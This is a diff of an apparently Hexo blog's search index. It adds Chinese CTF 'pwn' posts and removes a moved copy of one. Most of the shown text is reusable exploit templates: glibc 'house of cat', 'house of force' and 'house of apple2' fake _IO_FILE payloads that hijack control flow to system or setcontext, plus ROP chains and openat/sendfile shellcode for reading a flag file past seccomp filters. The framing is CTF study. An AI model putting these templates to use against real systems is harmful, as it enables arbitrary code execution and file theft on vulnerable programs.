@@ -4,8 +4,9 @@
     <title>Data_Structure</title>
     <url>/2024/09/26/Data-Structure/</url>
     <content><![CDATA[<h1 id="Data-Structure"><a href="#Data-Structure" class="headerlink" title="Data_Structure"></a>Data_Structure</h1><span id="more"></span>
+<br>
 
-<h2 id="没有技巧，全是粘贴"><a href="#没有技巧，全是粘贴" class="headerlink" title=" 没有技巧，全是粘贴"></a><strong><em> 没有技巧，全是粘贴</em></strong></h2><h2 id="NO-SKILLS，ALL-PASRING"><a href="#NO-SKILLS，ALL-PASRING" class="headerlink" title="NO SKILLS，ALL PASRING"></a>NO SKILLS，ALL PASRING</h2><p></p>
+<h1 id="没有技巧，全是粘贴"><a href="#没有技巧，全是粘贴" class="headerlink" title=" 没有技巧，全是粘贴"></a><strong><em> 没有技巧，全是粘贴</em></strong></h1><h1 id="NO-SKILLS，ALL-PASRING"><a href="#NO-SKILLS，ALL-PASRING" class="headerlink" title="NO SKILLS，ALL PASRING"></a>NO SKILLS，ALL PASRING</h1><p></p>
 <br>
 
 <h2 id="Link-List"><a href="#Link-List" class="headerlink" title="Link_List"></a>Link_List</h2><br>
@@ -763,6 +764,297 @@ _IO_str_jumps
       </tags>
   </entry>
   <entry>
+    <title>house of模板</title>
+    <url>/2024/07/25/house%20of/</url>
+    <content><![CDATA[<h1 id="house-of-利用模板及利用条件"><a href="#house-of-利用模板及利用条件" class="headerlink" title="house of 利用模板及利用条件"></a>house of 利用模板及利用条件</h1><span id="more"></span>
+
+<hr>
+<p><em>tips:</em><br>1、于glibc2.34后glibc就移除了hook一类<br>2、_malloc_assert于glibc2.35被移除</p>
+<h2 id="house-of-cat"><a href="#house-of-cat" class="headerlink" title="house of cat"></a>house of cat</h2><p>原文链接：<a href="https://bbs.kanxue.com/thread-273895.htm#msg_header_h3_6">https://bbs.kanxue.com/thread-273895.htm#msg_header_h3_6</a><br><br><br><em>条件</em><br>glibc版本：任何版本<br>地址：libc_base、heap<br>可触发IO流:FSOP、_malloc_assert或存在可以进入IO链的函数如puts<br><br></p>
+<p><em>调用链： </em><br>1、_IO_wfile_jumps-&gt;_IO_wfile_seekoff-&gt;_IO_switch_to_wget_mode(fp)-&gt;伪造file<br>2、exit() –&gt; __run_exit_handlers –&gt; _IO_cleanup –&gt; _IO_flush_all_lockp –&gt; _IO_wfile_seekoff–&gt; _IO_switch_to_wget_mode –&gt; _IO_switch_to_wget_mode 的 call rax</p>
+<h3 id="模板"><a href="#模板" class="headerlink" title="模板"></a>模板</h3><pre><code>fake_io_addr=heapbase+0xb00 # 伪造的fake_IO结构体的地址
+next_chain = 0
+fake_IO_FILE=p64(rdi)         #_flags=rdi
+fake_IO_FILE+=p64(0)*7
+fake_IO_FILE +=p64(1)+p64(2) # rcx!=0(FSOP)
+fake_IO_FILE +=p64(fake_io_addr+0xb0)#_IO_backup_base=rdx
+fake_IO_FILE +=p64(call_addr)#_IO_save_end=call addr(call setcontext/system)
+fake_IO_FILE = fake_IO_FILE.ljust(0x68, &#39;\x00&#39;)
+fake_IO_FILE += p64(0)  # _chain
+fake_IO_FILE = fake_IO_FILE.ljust(0x88, &#39;\x00&#39;)
+fake_IO_FILE += p64(heapbase+0x1000)  # _lock = a writable address
+fake_IO_FILE = fake_IO_FILE.ljust(0xa0, &#39;\x00&#39;)
+fake_IO_FILE +=p64(fake_io_addr+0x30)#_wide_data,rax1_addr
+fake_IO_FILE = fake_IO_FILE.ljust(0xc0, &#39;\x00&#39;)
+fake_IO_FILE += p64(1) #mode=1
+fake_IO_FILE = fake_IO_FILE.ljust(0xd8, &#39;\x00&#39;)
+fake_IO_FILE += p64(libcbase+0x2160c0+0x10)  # vtable=IO_wfile_jumps+0x10
+fake_IO_FILE +=p64(0)*6
+fake_IO_FILE += p64(fake_io_addr+0x40)  # rax2_addr
+</code></pre>
+<p>其中fake_io_addr为我们伪造IO_FILE结构体的地址。<br>vtable函数，如果打FSOP则改成IO_wifle_jumps+0x30.<br>rdi、rdx为我们调用函数的参数。  </p>
+<br>
+
+<p>例子orw：  </p>
+<pre><code>Fake_IO_File_Structure = IO_FILE_plus_struct(fake_io_addr)
+Fake_IO_File_Structure._IO_save_base = p64(1)                                           # RCX
+Fake_IO_File_Structure._IO_backup_base = p64(fake_io_addr + 0x120 - 0xa0)               # mov    rdx, qword ptr [rax + 0x20]
+Fake_IO_File_Structure._IO_save_end = p64(setcontext)                                   # call   qword ptr [rax + 0x18]
+Fake_IO_File_Structure._wide_data = p64(fake_io_addr + 0x30)                            # mov    rax, qword ptr [rdi + 0xa0]
+Fake_IO_File_Structure._offset = 0
+Fake_IO_File_Structure._vtable_offset = 0
+Fake_IO_File_Structure._mode = 1
+Fake_IO_File_Structure.vtable = p64(libc_base + libc.sym[&#39;_IO_wfile_jumps&#39;] + 0x30)
+
+Fake_IO_File_Structure = bytes(Fake_IO_File_Structure)
+Fake_IO_File_Structure += p64(0) * 6
+Fake_IO_File_Structure += p64(fake_io_addr + 0x40)                                      # mov    rax, qword ptr [rax + 0xe0]
+Fake_IO_File_Structure = Fake_IO_File_Structure.ljust(0x120, b&#39;\x00&#39;) + p64(fake_io_addr + 0x128) + p64(ret)
+rop = p64(rdi) + p64((fake_io_addr &gt;&gt; 12) &lt;&lt; 12) + p64(rsi) + p64(0x1000) + p64(rdx_r12) + p64(7) * 2 + p64(mprotect) + p64(fake_io_addr + 0x178) + asm(shellcraft.cat(&#39;/flag&#39;))
+
+Fake_IO_File_Structure += rop
+</code></pre>
+<br>
+<br> 
+
+<h3 id="house-of-force"><a href="#house-of-force" class="headerlink" title="house of force"></a>house of force</h3><p><em>条件</em><br>1、glibc：2.23-2.29<br>2、malloc size无限制，或size可以很大<br>3、至少可以溢出8字节</p>
+<p><em>利用流程：</em></p>
+<pre><code>修改topchunk_size为0xffffffffffffffff
+计算target_size=target_addrtopchunk_addr-0x30
+malloc一个chunk
+getshell
+ 
+ 
+</code></pre>
+<br>
+ 
+<h2 id="house-of-apple2"><a href="#house-of-apple2" class="headerlink" title="house of apple2"></a>house of apple2</h2><p>个人感觉这个house of apple与house of cat不同必须要泄露heap地址，毕竟apple需要两个伪造的地址来控制eip，除非你知道栈地址。<br>具体原理请看:<a href="https://bbs.kanxue.com/thread-273832.htm">https://bbs.kanxue.com/thread-273832.htm</a>       </p>
+<br>
+<em>适用版本</em>    
+glibc:2.34-         
+
+<br>
+<em>条件</em>                               
+
+<p>1、能控制_IO_FILE的vtable和_wide_data，或者可以largebinattack<br>2、可以泄露heap和libc地址<br>3、可以执行IO流，exit、malloc assert、返回main函数…….  </p>
+<br>
+<br>
+
+<h3 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>在_IO_2_1_stderr&#x2F;stdout&#x2F;stdin_中，vatable函数在glibc2.24之后，增加了范围检查。<br>但是在_IO_wide_date这个结构体成员变量中，存在一个_wide_vtable成员变量，这个功能与vatble一致,但是与file结构体中的vtable不同的是，在这个_wide_vtable中是没有范围检查的直接调用宏了。<br><br></p>
+<p><em>所以根据上述描述可以将</em><br>    _IO_wide_date覆盖成我们的可控heap地址<br>    vtable覆盖成_IO_wfile_jmups<br>    _wide_vtable劫持为我们的rip        </p>
+<h3 id="共有三种v劫持IO流的方式"><a href="#共有三种v劫持IO流的方式" class="headerlink" title="共有三种v劫持IO流的方式"></a>共有三种v劫持IO流的方式</h3><pre><code>_IO_wfile_overflow
+_IO_wfile_underflow_mmap
+_IO_wdefault_xsgetn
+</code></pre>
+<br>
+
+<h3 id="1、-利用-IO-wfile-overflow"><a href="#1、-利用-IO-wfile-overflow" class="headerlink" title="1、 利用_IO_wfile_overflow"></a>1、 利用_IO_wfile_overflow</h3><p><em>调用链</em>     </p>
+<pre><code>_IO_wfile_overflow
+    _IO_wdoallocbuf
+        _IO_WDOALLOCATE
+            *(fp-&gt;_wide_data-&gt;_wide_vtable + 0x68)(fp)
+</code></pre>
+<br>
+<em>伪造file及_IO_wide_date_</em>
+
+<pre><code>_flags设置为~(2 | 0x8 | 0x800)，如果不需要控制rdi，设置为0即可；如果需要获得shell，可设置为 sh;，注意前面有两个空格
+vtable设置为_IO_wfile_jumps/_IO_wfile_jumps_mmap/_IO_wfile_jumps_maybe_mmap地址（加减偏移），使其能成功调用_IO_wfile_overflow即可
+_wide_data设置为可控堆地址A，即满足*(fp + 0xa0) = A
+_wide_data-&gt;_IO_write_base设置为0，即满足*(A + 0x18) = 0
+_wide_data-&gt;_IO_buf_base设置为0，即满足*(A + 0x30) = 0
+_wide_data-&gt;_wide_vtable设置为可控堆地址B，即满足*(A + 0xe0) = B
+_wide_data-&gt;_wide_vtable-&gt;doallocate设置为地址C用于劫持RIP，即满足*(B + 0x68) = C
+</code></pre>
+<p><em>条件绕过</em>        </p>
+<pre><code>需要满足f-&gt;_flags &amp; _IO_NO_WRITES == 0并且f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING == 0和f-&gt;_wide_data-&gt;_IO_write_base == 0
+需要满足fp-&gt;_wide_data-&gt;_IO_buf_base != 0和fp-&gt;_flags &amp; _IO_UNBUFFERED == 0。
+</code></pre>
+<br>
+    模板（getshell）
+<em>需要将伪造chunk的pre_size位伪造成  '  sh;'  或者  ';sh\x00'  </em>    
+
+
+<pre><code>    fake_io_file = p64(0)*2 + p64(1) + p64(2)
+    fake_io_file = fake_io_file.ljust(0xa0 - 0x10, b&#39;\0&#39;) + p64(chunk_addr+0x100) # _wide_data
+    fake_io_file = fake_io_file.ljust(0xc0 - 0x10, b&#39;\0&#39;) + p64(0xffffffffffffffff) # _mode
+    fake_io_file = fake_io_file.ljust(0xd8 - 0x10, b&#39;\0&#39;) + p64(io_wfile_jumps) # vtable
+    fake_io_file = fake_io_file.ljust(0x100 - 0x10 + 0xe0, b&#39;\0&#39;) + p64(chunk_addr+0x200)
+    fake_io_file = fake_io_file.ljust(0x200-0x10,b&#39;\0&#39;)+p64(0)*13+ p64(sys)
+    
+</code></pre>
+<br>
+<br>
+
+<h3 id="2、利用IO-wfile-underflow-mmap"><a href="#2、利用IO-wfile-underflow-mmap" class="headerlink" title="2、利用IO_wfile_underflow_mmap"></a>2、利用IO_wfile_underflow_mmap</h3><p><em>调用链</em><br>    _IO_wfile_underflow_mmap<br>        _IO_wdoallocbuf<br>            _IO_WDOALLOCATE<br>                *(fp-&gt;_wide_data-&gt;_wide_vtable + 0x68)(fp)          </p>
+<br>
+<em>伪造</em>   
+
+<pre><code>_flags设置为~4，如果不需要控制rdi，设置为0即可；如果需要获得shell，可设置为 sh;，注意前面有个空格
+vtable设置为_IO_wfile_jumps_mmap地址（加减偏移），使其能成功调用_IO_wfile_underflow_mmap即可
+_IO_read_ptr &lt; _IO_read_end，即满足*(fp + 8) &lt; *(fp + 0x10)
+_wide_data设置为可控堆地址A，即满足*(fp + 0xa0) = A
+_wide_data-&gt;_IO_read_ptr &gt;= _wide_data-&gt;_IO_read_end，即满足*A &gt;= *(A + 8)
+_wide_data-&gt;_IO_buf_base设置为0，即满足*(A + 0x30) = 0
+_wide_data-&gt;_IO_save_base设置为0或者合法的可被free的地址，即满足*(A + 0x40) = 0
+_wide_data-&gt;_wide_vtable设置为可控堆地址B，即满足*(A + 0xe0) = B
+_wide_data-&gt;_wide_vtable-&gt;doallocate设置为地址C用于劫持RIP，即满足*(B + 0x68) = C
+</code></pre>
+<br>
+<em>条件绕过</em>       
+
+<pre><code>需要设置fp-&gt;_flags &amp; _IO_NO_READS == 0，设置fp-&gt;_wide_data-&gt;_IO_read_ptr &gt;= fp-&gt;_wide_data-&gt;_IO_read_end，设置fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end不进入调用，设置fp-&gt;_wide_data-&gt;_IO_buf_base == NULL和fp-&gt;_wide_data-&gt;_IO_save_base == NULL。        
+</code></pre>
+<br>
+
+<h3 id="3、利用-IO-wdefault-xsgetn"><a href="#3、利用-IO-wdefault-xsgetn" class="headerlink" title="3、利用_IO_wdefault_xsgetn"></a>3、利用_IO_wdefault_xsgetn</h3><p><em>调用链</em>    </p>
+<pre><code>_IO_wdefault_xsgetn
+    __wunderflow
+        _IO_switch_to_wget_mode
+            _IO_WOVERFLOW
+                *(fp-&gt;_wide_data-&gt;_wide_vtable + 0x18)(fp)
+</code></pre>
+<br>
+<em>伪造</em>       
+
+<pre><code>_flags设置为0x800
+vtable设置为_IO_wstrn_jumps/_IO_wmem_jumps/_IO_wstr_jumps地址（加减偏移），使其能成功调用_IO_wdefault_xsgetn即可
+_mode设置为大于0，即满足*(fp + 0xc0) &gt; 0
+_wide_data设置为可控堆地址A，即满足*(fp + 0xa0) = A
+_wide_data-&gt;_IO_read_end == _wide_data-&gt;_IO_read_ptr设置为0，即满足*(A + 8) = *A
+_wide_data-&gt;_IO_write_ptr &gt; _wide_data-&gt;_IO_write_base，即满足*(A + 0x20) &gt; *(A + 0x18)
+_wide_data-&gt;_wide_vtable设置为可控堆地址B，即满足*(A + 0xe0) = B
+_wide_data-&gt;_wide_vtable-&gt;overflow设置为地址C用于劫持RIP，即满足*(B + 0x18) = C
+</code></pre>
+<br>
+
+<p><em>条件绕过</em>   </p>
+<pre><code>直接设置fp-&gt;_wide_data-&gt;_IO_read_ptr == fp-&gt;_wide_data-&gt;_IO_read_end，使得count为0，不进入if分支。
+随后当more != 0时会进入__wunderflow。   
+要想调用到_IO_switch_to_wget_mode，需要设置fp-&gt;mode &gt; 0，并且fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING != 0。
+当满足fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base时就会调用_IO_WOVERFLOW(fp)。
+</code></pre>
+<br>
+<br>
+
+<hr>
+]]></content>
+      <tags>
+        <tag>pwn</tag>
+        <tag>IO</tag>
+        <tag>house of</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>orw</title>
+    <url>/2024/08/10/orw%E6%A8%A1%E6%9D%BF/</url>
+    <content><![CDATA[<hr>
+<h1 id="orw-模板"><a href="#orw-模板" class="headerlink" title="orw 模板"></a>orw 模板</h1> <span id="more"></span>        
+
+<h3 id="tips"><a href="#tips" class="headerlink" title="tips"></a><em>tips</em></h3><p>liunx64：<br>1、read 0、readv 19<br>2、write 1、writev 20<br>3、open 2、openat 257<br>4、sendfile 40    </p>
+<br>
+ 
+<h2 id="orw的原型及参数"><a href="#orw的原型及参数" class="headerlink" title="orw的原型及参数"></a>orw的原型及参数</h2><pre><code>1. read
+原型: ssize_t read(int fd, void *buf, size_t count);
+参数:
+fd：文件描述符。
+buf：指向存储读取数据的缓冲区的指针。
+count：要读取的字节数。      
+
+2. readv
+原型: ssize_t readv(int fd, const struct iovec *iov, int iovcnt);
+参数:
+fd：文件描述符。
+iov：指向 iovec 结构体数组的指针，每个 iovec 结构体包含一个缓冲区及其大小。
+iovcnt：iovec 结构体的数量。  
+
+3. write
+原型: ssize_t write(int fd, const void *buf, size_t count);
+参数:
+fd：文件描述符。
+buf：指向要写入的数据的缓冲区的指针。
+count：要写入的字节数。
+
+4. writev
+原型: ssize_t writev(int fd, const struct iovec *iov, int iovcnt);
+参数:
+fd：文件描述符。
+iov：指向 iovec 结构体数组的指针，每个 iovec 结构体包含一个缓冲区及其大小。
+iovcnt：iovec 结构体的数量。
+
+5. open
+原型: int open(const char *pathname, int flags, mode_t mode);
+参数:
+pathname：要打开的文件的路径。
+flags：打开文件的标志，如 O_RDONLY、O_WRONLY、O_RDWR。
+mode：文件权限，仅在使用 O_CREAT 标志时需要。
+
+6. openat
+原型: int openat(int dirfd, const char *pathname, int flags, mode_t mode);
+参数:
+dirfd：目录文件描述符，表示相对路径的基准目录（可以是 AT_FDCWD）。
+pathname：要打开的文件的路径。
+flags：打开文件的标志，如 O_RDONLY、O_WRONLY、O_RDWR。
+mode：文件权限，仅在使用 O_CREAT 标志时需要。
+
+7. sendfile
+原型: ssize_t sendfile(int out_fd, int in_fd, off_t *offset, size_t count);
+参数:
+out_fd：目标文件描述符（通常是套接字）。
+in_fd：源文件描述符。
+offset：偏移量的指针，用于指定从源文件中开始的字节位置（如果为 NULL，从当前文件位置开始）。
+count：要发送的字节数。
+</code></pre>
+<h3 id="模版"><a href="#模版" class="headerlink" title="模版"></a><em>模版</em></h3><p>只禁用了execve   </p>
+<pre><code>o=base+libc.sym[&#39;open&#39;]
+r=base+libc.sym[&#39;read&#39;]
+w=base+libc.sym[&#39;write&#39;]
+orw=p64(rdi)+p64(flag)+p64(rsi)+p64(0)+p64(o)
+orw+=p64(rdi)+p64(3)+p64(rsi)+p64(flag)+p64(rdx_r)+p64(0x30)+p64(0)+p64(r)
+orw+=p64(rdi)+p64(1)+p64(rsi)+p64(flag)+p64(rdx_r)+p64(0x30)+p64(0)+p64(w)
+</code></pre>
+<p>其中的寄存器的呈现形式及赋值视情况而变动。</p>
+ <br>
+ ### <em>sendfile</em>
+ 禁用open、execve、read、write、readv、writev
+
+<pre><code>asm(&#39;&#39;&#39;
+mov rdi,3;                    #openat调用
+mov rdx,0;
+mov r10,0;
+mov rsi,flag;                 #flag地址
+mov rax,257;
+syscall;
+
+mov rdi,0;                    #sendfile调用  
+mov rsi,3;
+mov rdi,1;
+xor rdx,rdx;
+mov r10,0x33;                 #读取大小
+mov rax,40;
+syscall;
+
+
+mov rax,60;                    #exit调用
+xor rdi,rdi;
+syscall;
+&#39;&#39;&#39;
+)
+</code></pre>
+<p>其中指令的表现形式也视具体情况而变动。<br><br><br>比正常情况下少了8字节</p>
+<pre><code>o = libc_base + libc.sym[&#39;open&#39;]
+sendfile = libc_base + libc.sym[&#39;sendfile&#39;]
+orw = p64(rdi)+p64(flag)+p64(rsi)+p64(0)+p64(o)
+orw+=p64(rdi)+p64(1)+p64(rsi)+p64(3)+p64(rdx)+p64(0)+p64(r10)+p64(r/w_size)+p64(sendfile)
+</code></pre>
+<hr>
+]]></content>
+      <tags>
+        <tag>pwn</tag>
+        <tag>ctf</tag>
+        <tag>orw</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>bin</title>
     <url>/2024/07/18/bin/</url>
     <content><![CDATA[<hr>
@@ -1358,297 +1650,6 @@ inter()
 ]]></content>
       <tags>
         <tag>pwn</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>house of模板</title>
-    <url>/2024/07/25/house%20of/</url>
-    <content><![CDATA[<h1 id="house-of-利用模板及利用条件"><a href="#house-of-利用模板及利用条件" class="headerlink" title="house of 利用模板及利用条件"></a>house of 利用模板及利用条件</h1><span id="more"></span>
-
-<hr>
-<p><em>tips:</em><br>1、于glibc2.34后glibc就移除了hook一类<br>2、_malloc_assert于glibc2.35被移除</p>
-<h2 id="house-of-cat"><a href="#house-of-cat" class="headerlink" title="house of cat"></a>house of cat</h2><p>原文链接：<a href="https://bbs.kanxue.com/thread-273895.htm#msg_header_h3_6">https://bbs.kanxue.com/thread-273895.htm#msg_header_h3_6</a><br><br><br><em>条件</em><br>glibc版本：任何版本<br>地址：libc_base、heap<br>可触发IO流:FSOP、_malloc_assert或存在可以进入IO链的函数如puts<br><br></p>
-<p><em>调用链： </em><br>1、_IO_wfile_jumps-&gt;_IO_wfile_seekoff-&gt;_IO_switch_to_wget_mode(fp)-&gt;伪造file<br>2、exit() –&gt; __run_exit_handlers –&gt; _IO_cleanup –&gt; _IO_flush_all_lockp –&gt; _IO_wfile_seekoff–&gt; _IO_switch_to_wget_mode –&gt; _IO_switch_to_wget_mode 的 call rax</p>
-<h3 id="模板"><a href="#模板" class="headerlink" title="模板"></a>模板</h3><pre><code>fake_io_addr=heapbase+0xb00 # 伪造的fake_IO结构体的地址
-next_chain = 0
-fake_IO_FILE=p64(rdi)         #_flags=rdi
-fake_IO_FILE+=p64(0)*7
-fake_IO_FILE +=p64(1)+p64(2) # rcx!=0(FSOP)
-fake_IO_FILE +=p64(fake_io_addr+0xb0)#_IO_backup_base=rdx
-fake_IO_FILE +=p64(call_addr)#_IO_save_end=call addr(call setcontext/system)
-fake_IO_FILE = fake_IO_FILE.ljust(0x68, &#39;\x00&#39;)
-fake_IO_FILE += p64(0)  # _chain
-fake_IO_FILE = fake_IO_FILE.ljust(0x88, &#39;\x00&#39;)
-fake_IO_FILE += p64(heapbase+0x1000)  # _lock = a writable address
-fake_IO_FILE = fake_IO_FILE.ljust(0xa0, &#39;\x00&#39;)
-fake_IO_FILE +=p64(fake_io_addr+0x30)#_wide_data,rax1_addr
-fake_IO_FILE = fake_IO_FILE.ljust(0xc0, &#39;\x00&#39;)
-fake_IO_FILE += p64(1) #mode=1
-fake_IO_FILE = fake_IO_FILE.ljust(0xd8, &#39;\x00&#39;)
-fake_IO_FILE += p64(libcbase+0x2160c0+0x10)  # vtable=IO_wfile_jumps+0x10
-fake_IO_FILE +=p64(0)*6
-fake_IO_FILE += p64(fake_io_addr+0x40)  # rax2_addr
-</code></pre>
-<p>其中fake_io_addr为我们伪造IO_FILE结构体的地址。<br>vtable函数，如果打FSOP则改成IO_wifle_jumps+0x30.<br>rdi、rdx为我们调用函数的参数。  </p>
-<br>
-
-<p>例子orw：  </p>
-<pre><code>Fake_IO_File_Structure = IO_FILE_plus_struct(fake_io_addr)
-Fake_IO_File_Structure._IO_save_base = p64(1)                                           # RCX
-Fake_IO_File_Structure._IO_backup_base = p64(fake_io_addr + 0x120 - 0xa0)               # mov    rdx, qword ptr [rax + 0x20]
-Fake_IO_File_Structure._IO_save_end = p64(setcontext)                                   # call   qword ptr [rax + 0x18]
-Fake_IO_File_Structure._wide_data = p64(fake_io_addr + 0x30)                            # mov    rax, qword ptr [rdi + 0xa0]
-Fake_IO_File_Structure._offset = 0
-Fake_IO_File_Structure._vtable_offset = 0
-Fake_IO_File_Structure._mode = 1
-Fake_IO_File_Structure.vtable = p64(libc_base + libc.sym[&#39;_IO_wfile_jumps&#39;] + 0x30)
-
-Fake_IO_File_Structure = bytes(Fake_IO_File_Structure)
-Fake_IO_File_Structure += p64(0) * 6
-Fake_IO_File_Structure += p64(fake_io_addr + 0x40)                                      # mov    rax, qword ptr [rax + 0xe0]
-Fake_IO_File_Structure = Fake_IO_File_Structure.ljust(0x120, b&#39;\x00&#39;) + p64(fake_io_addr + 0x128) + p64(ret)
-rop = p64(rdi) + p64((fake_io_addr &gt;&gt; 12) &lt;&lt; 12) + p64(rsi) + p64(0x1000) + p64(rdx_r12) + p64(7) * 2 + p64(mprotect) + p64(fake_io_addr + 0x178) + asm(shellcraft.cat(&#39;/flag&#39;))
-
-Fake_IO_File_Structure += rop
-</code></pre>
-<br>
-<br> 
-
-<h3 id="house-of-force"><a href="#house-of-force" class="headerlink" title="house of force"></a>house of force</h3><p><em>条件</em><br>1、glibc：2.23-2.29<br>2、malloc size无限制，或size可以很大<br>3、至少可以溢出8字节</p>
-<p><em>利用流程：</em></p>
-<pre><code>修改topchunk_size为0xffffffffffffffff
-计算target_size=target_addrtopchunk_addr-0x30
-malloc一个chunk
-getshell
- 
- 
-</code></pre>
-<br>
- 
-<h2 id="house-of-apple2"><a href="#house-of-apple2" class="headerlink" title="house of apple2"></a>house of apple2</h2><p>个人感觉这个house of apple与house of cat不同必须要泄露heap地址，毕竟apple需要两个伪造的地址来控制eip，除非你知道栈地址。<br>具体原理请看:<a href="https://bbs.kanxue.com/thread-273832.htm">https://bbs.kanxue.com/thread-273832.htm</a>       </p>
-<br>
-<em>适用版本</em>    
-glibc:2.34-         
-
-<br>
-<em>条件</em>                               
-
-<p>1、能控制_IO_FILE的vtable和_wide_data，或者可以largebinattack<br>2、可以泄露heap和libc地址<br>3、可以执行IO流，exit、malloc assert、返回main函数…….  </p>
-<br>
-<br>
-
-<h3 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>在_IO_2_1_stderr&#x2F;stdout&#x2F;stdin_中，vatable函数在glibc2.24之后，增加了范围检查。<br>但是在_IO_wide_date这个结构体成员变量中，存在一个_wide_vtable成员变量，这个功能与vatble一致,但是与file结构体中的vtable不同的是，在这个_wide_vtable中是没有范围检查的直接调用宏了。<br><br></p>
-<p><em>所以根据上述描述可以将</em><br>    _IO_wide_date覆盖成我们的可控heap地址<br>    vtable覆盖成_IO_wfile_jmups<br>    _wide_vtable劫持为我们的rip        </p>
-<h3 id="共有三种v劫持IO流的方式"><a href="#共有三种v劫持IO流的方式" class="headerlink" title="共有三种v劫持IO流的方式"></a>共有三种v劫持IO流的方式</h3><pre><code>_IO_wfile_overflow
-_IO_wfile_underflow_mmap
-_IO_wdefault_xsgetn
-</code></pre>
-<br>
-
-<h3 id="1、-利用-IO-wfile-overflow"><a href="#1、-利用-IO-wfile-overflow" class="headerlink" title="1、 利用_IO_wfile_overflow"></a>1、 利用_IO_wfile_overflow</h3><p><em>调用链</em>     </p>
-<pre><code>_IO_wfile_overflow
-    _IO_wdoallocbuf
-        _IO_WDOALLOCATE
-            *(fp-&gt;_wide_data-&gt;_wide_vtable + 0x68)(fp)
-</code></pre>
-<br>
-<em>伪造file及_IO_wide_date_</em>
-
-<pre><code>_flags设置为~(2 | 0x8 | 0x800)，如果不需要控制rdi，设置为0即可；如果需要获得shell，可设置为 sh;，注意前面有两个空格
-vtable设置为_IO_wfile_jumps/_IO_wfile_jumps_mmap/_IO_wfile_jumps_maybe_mmap地址（加减偏移），使其能成功调用_IO_wfile_overflow即可
-_wide_data设置为可控堆地址A，即满足*(fp + 0xa0) = A
-_wide_data-&gt;_IO_write_base设置为0，即满足*(A + 0x18) = 0
-_wide_data-&gt;_IO_buf_base设置为0，即满足*(A + 0x30) = 0
-_wide_data-&gt;_wide_vtable设置为可控堆地址B，即满足*(A + 0xe0) = B
-_wide_data-&gt;_wide_vtable-&gt;doallocate设置为地址C用于劫持RIP，即满足*(B + 0x68) = C
-</code></pre>
-<p><em>条件绕过</em>        </p>
-<pre><code>需要满足f-&gt;_flags &amp; _IO_NO_WRITES == 0并且f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING == 0和f-&gt;_wide_data-&gt;_IO_write_base == 0
-需要满足fp-&gt;_wide_data-&gt;_IO_buf_base != 0和fp-&gt;_flags &amp; _IO_UNBUFFERED == 0。
-</code></pre>
-<br>
-    模板（getshell）
-<em>需要将伪造chunk的pre_size位伪造成  '  sh;'  或者  ';sh\x00'  </em>    
-
-
-<pre><code>    fake_io_file = p64(0)*2 + p64(1) + p64(2)
-    fake_io_file = fake_io_file.ljust(0xa0 - 0x10, b&#39;\0&#39;) + p64(chunk_addr+0x100) # _wide_data
-    fake_io_file = fake_io_file.ljust(0xc0 - 0x10, b&#39;\0&#39;) + p64(0xffffffffffffffff) # _mode
-    fake_io_file = fake_io_file.ljust(0xd8 - 0x10, b&#39;\0&#39;) + p64(io_wfile_jumps) # vtable
-    fake_io_file = fake_io_file.ljust(0x100 - 0x10 + 0xe0, b&#39;\0&#39;) + p64(chunk_addr+0x200)
-    fake_io_file = fake_io_file.ljust(0x200-0x10,b&#39;\0&#39;)+p64(0)*13+ p64(sys)
-    
-</code></pre>
-<br>
-<br>
-
-<h3 id="2、利用IO-wfile-underflow-mmap"><a href="#2、利用IO-wfile-underflow-mmap" class="headerlink" title="2、利用IO_wfile_underflow_mmap"></a>2、利用IO_wfile_underflow_mmap</h3><p><em>调用链</em><br>    _IO_wfile_underflow_mmap<br>        _IO_wdoallocbuf<br>            _IO_WDOALLOCATE<br>                *(fp-&gt;_wide_data-&gt;_wide_vtable + 0x68)(fp)          </p>
-<br>
-<em>伪造</em>   
-
-<pre><code>_flags设置为~4，如果不需要控制rdi，设置为0即可；如果需要获得shell，可设置为 sh;，注意前面有个空格
-vtable设置为_IO_wfile_jumps_mmap地址（加减偏移），使其能成功调用_IO_wfile_underflow_mmap即可
-_IO_read_ptr &lt; _IO_read_end，即满足*(fp + 8) &lt; *(fp + 0x10)
-_wide_data设置为可控堆地址A，即满足*(fp + 0xa0) = A
-_wide_data-&gt;_IO_read_ptr &gt;= _wide_data-&gt;_IO_read_end，即满足*A &gt;= *(A + 8)
-_wide_data-&gt;_IO_buf_base设置为0，即满足*(A + 0x30) = 0
-_wide_data-&gt;_IO_save_base设置为0或者合法的可被free的地址，即满足*(A + 0x40) = 0
-_wide_data-&gt;_wide_vtable设置为可控堆地址B，即满足*(A + 0xe0) = B
-_wide_data-&gt;_wide_vtable-&gt;doallocate设置为地址C用于劫持RIP，即满足*(B + 0x68) = C
-</code></pre>
-<br>
-<em>条件绕过</em>       
-
-<pre><code>需要设置fp-&gt;_flags &amp; _IO_NO_READS == 0，设置fp-&gt;_wide_data-&gt;_IO_read_ptr &gt;= fp-&gt;_wide_data-&gt;_IO_read_end，设置fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end不进入调用，设置fp-&gt;_wide_data-&gt;_IO_buf_base == NULL和fp-&gt;_wide_data-&gt;_IO_save_base == NULL。        
-</code></pre>
-<br>
-
-<h3 id="3、利用-IO-wdefault-xsgetn"><a href="#3、利用-IO-wdefault-xsgetn" class="headerlink" title="3、利用_IO_wdefault_xsgetn"></a>3、利用_IO_wdefault_xsgetn</h3><p><em>调用链</em>    </p>
-<pre><code>_IO_wdefault_xsgetn
-    __wunderflow
-        _IO_switch_to_wget_mode
-            _IO_WOVERFLOW
-                *(fp-&gt;_wide_data-&gt;_wide_vtable + 0x18)(fp)
-</code></pre>
-<br>
-<em>伪造</em>       
-
-<pre><code>_flags设置为0x800
-vtable设置为_IO_wstrn_jumps/_IO_wmem_jumps/_IO_wstr_jumps地址（加减偏移），使其能成功调用_IO_wdefault_xsgetn即可
-_mode设置为大于0，即满足*(fp + 0xc0) &gt; 0
-_wide_data设置为可控堆地址A，即满足*(fp + 0xa0) = A
